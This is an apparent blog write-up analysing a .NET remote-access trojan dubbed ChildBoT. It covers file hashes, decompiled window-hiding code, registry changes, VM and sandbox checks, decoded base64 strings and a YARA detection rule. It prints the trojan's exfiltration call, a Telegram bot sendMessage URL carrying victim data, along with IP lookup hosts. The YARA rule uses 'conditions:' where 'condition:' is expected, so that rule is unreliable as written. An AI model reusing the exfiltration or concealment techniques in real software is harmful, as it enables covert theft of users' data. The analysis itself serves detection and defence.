---
  title: "ChildBoT Analysis"
  date: 2024-01-17 00:00:00 +0800
  categories: Malware Analysis
  tags: [Malware Analysis,ChildBot]
---

# ChildBoT Analysis

## Analysis
```
MD5:30705266725F9BAD60EA12821ACF740A
SHA256: D60BB69DA27799D822608902C59373611C18920C77887DE7489D289EBF2BD53E
```

### Virus Total 

- At VirusTotal.com, 40 out of 69 engines for AV detection mark the software as malicious.


![Alt text](image.png)

### CFF explorer

- I ran CFF explorer on the executable file to find that it is a .NET framework executable.

![Alt text](image-1.png)

- Let's fire it up inside a VM and see its activity:

### ProcMonitor

![Alt text](image-2.png)  

### Task Manager

![Alt text](image-7.png)

- I used dnSpy 32-bit version to decompile the executable file to get the csharp code of the file.


![Alt text](image-3.png)

- First of all , the malware is as usual trying to hide itself from the user hiding its window as well as not making itself visible on the taskbar using:

```
	base.Hide();
	base.WindowState = FormWindowState.Minimized;
	base.FormBorderStyle = FormBorderStyle.None;
	base.ShowInTaskbar = false;
```
- Here I first find the HttpRequest function which is trying to access an unknown host server:

```
http://icanhazip.com
```
- I sent requests to this server only to get an IP-Address: 

![Alt text](image-4.png)

- This function is trying to access the windows registry keys and modifying them

![Alt text](image-8.png)

- Registry keys acessed and modified to:

```
SOFTWARE\WOW6432Node\Clients\StartMenuInternet =>SOFTWARE\Clients\StartMenuInternet
```
- The malware tries to find the string `あใはさまゆさปありねひむよとよฃยねปむ` inside the XML documents using the XMLParser.

- The malware is sending a `GET` request to the host: `https://api.telegram.org/bot/sendMessage?chat_id=<chat_id>&text=<Victim's_Data>`

![Alt text](image-9.png)

- The malware also tries to capture the keyboard and display control using SQL Queries inside the Registy Key Editor:

![Alt text](image-12.png)

The base64 string decodes to :

```
Select * from Win32_Keyboard
```
- This function tries to make a `GET` request on:

```
http://ipinfo.io/ip
```

![Alt text](image-10.png)

and is splitting and trimming all the data received by it to get the data in raw format.
- The data received at this host address is another IP-Address:

```
122.176.193.234
```
- The function `fn_check_activity` checks all the results of the functions trying to get the info about the victim's system and use `SQLite.Interop.dll` for this.

![Alt text](image-11.png)

- It tries to find some strings inside the Registry Keys Editor in Windows system in order to modify them in favour of the attacker:

```
Microsoft Edge
IEXPLORE.EXE
```
- During my analysis I came up to witness some base64 encoded strings that were being sent to the server after some basic checks on the local system of the victim.
```
4puU77iPIERFVEVDVCBWTSxTQU5CT1g6 : {⛔️ DETECT VM,SANBOX:} 
VG8gY29udGludWUgcGxlYXNlIHdyaXRlIHRoZSBjb250ZW50OiBbSFdJRF0tU0tJUCBWTSBPciDinYwgRXhpdCAgOltIV0lEXS1FWElU : {To continue please write the content: [HWID]-SKIP VM Or ❌ Exit  :[HWID]-EXIT}
V2UgYXJlIHN0aWxsIGFjdGl2ZSB1bnRpbCB2aWN0aW1lIHNodXRzIGRvd24h : {We are still active until victime shuts down!}
 LSBNYXliZSBWTSxTYW5ib3g= : - Maybe VM,Sanbox
 LUVYSVQ= : {-EXIT}
 4p2MRVhJVCBTVUNDRVNT : {❌EXIT SUCCESS}
```

- This function makes a GET request to `
https://api.telegram.org/bot
` and try to give a form of data to a telegram bot.

![Alt text](image-5.png)

- However if the chat_id is not known.

```
{"ok":false,"error_code":404,"description":"Not Found"}
```
- The malware is using FNV hashing algorithm to hash the strings inside the malware 

![Alt text](image-6.png)

- This string is added to access the updates as got by the bot from the web server where the bot is working: `https://api.telegram.org/bot/getUpdates`

#### It is a RAT which is doing various malicious activities like: 
- Modifying Windows Registry keys
- `GET` Requests to unknown malicious websites.
- Setting up a Telegram Bot to update send the victim's private data and update it regularly.


### Yara Rules:
```
rule base64_string{
meta:
	desc = "base64 strings found decrypted."
	weight = 7
strings:
	$b1 = "SUVYUExPUkUuRVhF"
	$b2 = "TWljcm9zb2Z0IEVkZ2U="
	$b3 = "4p2MRVhJVCBTVUNDRVNT"
	$b4 = "LUVYSVQ="
	$b5 = "LSBNYXliZSBWTSxTYW5ib3g="
	$b6 = "VG8gY29udGludWUgcGxlYXNlIHdyaXRlIHRoZSBjb250ZW50OiBbSFdJRF0tU0tJUCBWTSBPciDinYwgRXhpdCAgOltIV0lEXS1FWElU"
	$b7 = "V2UgYXJlIHN0aWxsIGFjdGl2ZSB1bnRpbCB2aWN0aW1lIHNodXRzIGRvd24h"
	$b8 = "4puU77iPIERFVEVDVCBWTSxTQU5CT1g6"
	$b9 = "aHR0cDovL2lwaW5mby5pby9pcA=="
conditions:
	$b1 and $b2 and $b3 and $b4 and $b5 and $b6 and $b7 and $b8 and $b9
}
```

